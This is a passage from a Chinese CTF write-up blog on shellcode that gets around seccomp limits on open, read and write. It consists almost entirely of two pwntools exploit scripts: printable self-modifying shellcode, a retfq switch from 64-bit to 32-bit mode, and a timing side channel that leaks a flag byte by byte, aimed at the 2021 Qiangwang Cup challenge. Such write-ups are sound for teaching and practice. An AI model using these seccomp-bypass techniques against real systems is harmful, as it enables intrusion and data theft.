= <span class="hljs-string">'''</span><br><span class="hljs-string">/*fp = open("flag")*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = "flag" */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">'''</span><br><br>shellcode_flag = <span class="hljs-string">'''</span><br><span class="hljs-string">/* retfq:  mode_32 -&gt; mode_64*/</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404089</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*read(fp,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,rcx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,0x70</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*write(1,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">'''</span><br>shellcode_x86 = asm(shellcode_x86)<br>shellcode_flag = asm(shellcode_flag, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>shellcode = <span class="hljs-string">''</span><br><br><span class="hljs-comment"># 0x40404040 为32位shellcode地址</span><br>shellcode_mmap = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">/* syscall 的机器码是 0f 05, 都是不可打印字符. */</span><br><span class="hljs-string">/* 用异或运算来解决这个问题: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */</span><br><span class="hljs-string">/* 其中 0x52,0x5a 由 append 提供. */</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x31],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x32],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">'''</span><br>shellcode_read = <span class="hljs-string">'''</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x57],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x58],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">'''</span><br><br>shellcode_retfq = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-comment"># mmap</span><br>shellcode += shellcode_mmap<br>shellcode += append<br><br><span class="hljs-comment"># read shellcode</span><br>shellcode += shellcode_read<br>shellcode += append<br><br><span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>shellcode += shellcode_retfq<br>shellcode += append<br><br>shellcode = asm(shellcode,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-comment">#gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")</span><br>p.sendline(shellcode)<br>pause()<br><br>p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">'\x90'</span> + shellcode_flag)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h3 id="R-缺-OW-例题-2021-强网杯-初赛-shellcode"><a href="#R-缺-OW-例题-2021-强网杯-初赛-shellcode" class="headerlink" title="R 缺 OW (例题: 2021-强网杯-初赛-shellcode)"></a>R 缺 OW (例题: 2021-强网杯-初赛-shellcode)</h3><p>这道题其实就是 “R 缺 OW”，上面两种情况的融合怪。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># context.log_level = 'debug'</span><br><br>append_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">push ebx</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">'''</span><br>append = <span class="hljs-string">'''</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">'''</span><br><br>shellcode_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">/*fp = open("flag")*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = "flag" */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">'''</span><br>shellcode_x86 = asm(shellcode_x86)<br><br>shellcode_mmap = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x31],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x32],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">'''</span><br>shellcode_read = <span class="hljs-string">'''</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x57],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x58],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">'''</span><br><br>shellcode_retfq = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p, index, ch</span>):<br>    shellcode = <span class="hljs-string">''</span><br><br>    <span class="hljs-comment"># mmap</span><br>    shellcode += shellcode_mmap<br>    shellcode += append<br><br>    <span class="hljs-comment"># read shellcode</span><br>    shellcode += shellcode_read<br>    shellcode += append<br><br>    <span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>    shellcode += shellcode_retfq<br>    shellcode += append<br><br>    shellcode = asm(shellcode,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br>    <span class="hljs-comment">#print hex(len(shellcode))</span><br><br>    p.sendline(shellcode)<br>    time.sleep(<span class="hljs-number">0.05</span>)<br><br>    shellcode_flag =<span class="hljs-string">"""</span><br><span class="hljs-string">    push 0x33</span><br><span class="hljs-string">    push 0x40404089</span><br><span class="hljs-string">    retfq</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    /*read(fp,buf,0x70)*/</span><br><span class="hljs-string">    mov rdi,rcx</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    mov rdx,0x70</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    loop:</span><br><span class="hljs-string">    cmp byte ptr[rsi+{0}], {1}</span><br><span class="hljs-string">    jz loop</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    """</span>.<span class="hljs-built_in">format</span>(index, ch)<br>    shellcode_flag = asm(shellcode_flag,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br><br>    p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">'\x90'</span> + shellcode_flag)<br><br>flag = <span class="hljs-string">""</span><br>index = <span class="hljs-number">0</span><br>last = <span class="hljs-string">'a'</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    update = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        sh = process(<span class="hljs-string">"./shellcode"</span>)<br>        pwn(sh, index, ch)<br>        start = time.time()<br>        <span class="hljs-keyword">try</span>:<br>            sh.recv(timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        end = time.time()<br>        sh.close()<br>        <span class="hljs-keyword">if</span>(end-start &gt; <span class="hljs-number">1.5</span>):<br>            flag += <span class="hljs-built_in">chr</span>(ch)<br>            last = <span class="hljs-built_in">chr</span>(ch)<br>            update = <span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[ flag + 1 !!! ] "</span> + flag)<br>            <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">assert</span>(update == <span class="hljs-literal">True</span>)<br>    <br>    <span class="hljs-keyword">if</span>(last == <span class="hljs-string">'}'</span>):<br>        <span class="hljs-keyword">break</span><br>    <br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">"flag: "</span> + flag)<br></code></pre></td></tr></tbody></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/11/26/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"> Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A-ORW"><span class="toc-number">1.</span> <span class="toc-text">普通 ORW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OR-%E7%BC%BA-W-%E4%BE%8B%E9%A2%98-2021-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-slient"><span class="toc-number">2.</span> <span class="toc-text">OR 缺 W (例题: 2021-蓝帽杯初赛-slient)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exp"><span class="toc-number">2.2.</span> <span class="toc-text">Exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RW-%E7%BC%BA-O"><span class="toc-number">3.</span> <span class="toc-text">RW 缺 O</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-%E7%BC%BA-OW-%E4%BE%8B%E9%A2%98-2021-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E5%88%9D%E8%B5%9B-shellcode"><span class="toc-number">4.</span> <span class="toc-text">R 缺 OW (例题: 2021-强网杯-初赛-shellcode)</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>